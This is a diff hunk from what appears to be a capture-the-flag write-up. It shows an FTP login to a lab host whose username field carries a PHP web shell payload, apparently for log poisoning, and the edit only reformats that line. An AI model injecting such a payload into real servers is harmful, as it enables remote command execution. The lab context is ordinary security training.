@@ -179,7 +179,7 @@ Progress: 661680 / 661683 (100.00%)
 ftp 10.10.122.127
 Connected to 10.10.122.127.
 220 (vsFTPd 3.0.5)
-Name (10.10.122.127:kali): '<?php system($_GET['c']); ?>'
+Name (10.10.122.127:kali): ``` '<?php system($_GET['c']); ?>' ```
 331 Please specify the password.
 Password: 
 530 Login incorrect.
